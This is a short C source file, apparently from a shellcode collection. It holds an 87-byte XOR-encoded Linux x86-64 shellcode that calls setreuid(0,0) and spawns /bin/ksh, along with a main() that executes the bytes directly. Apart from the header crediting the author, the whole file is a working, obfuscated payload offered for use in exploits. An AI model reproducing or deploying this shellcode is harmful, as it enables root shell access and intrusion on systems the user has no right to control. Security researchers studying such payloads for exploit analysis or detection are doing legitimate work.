/*# Title: Linux x86-64 setreuid (0,0) & execve("/bin/ksh", ["/bin/ksh", NULL]) + XOR encoded - 87 bytes
# Author: egeektronic <info (at) egeektronic {dot} com>
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer
*/
unsigned char shellcode[] = 
"\x4d\x31\xc0\x41\xb1\x17\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb"
"\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48"
"\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x5f\x26\xd7\x5f\x94\xd7"
"\x66\x5f\x26\xe8\x5f\x26\xe1\x18\x12\xfc\x05\x5f\x26\xd7\x5f"
"\x94\xd7\x2c\x48\x5f\x26\xc5\x45\x40\x5f\x9e\xf1\x18\x12\xff"
"\xfe\xe8\xe8\xe8\x38\x75\x7e\x79\x38\x7c\x64\x7f";                                    
int main(void) { ((void (*)())shellcode)(); }
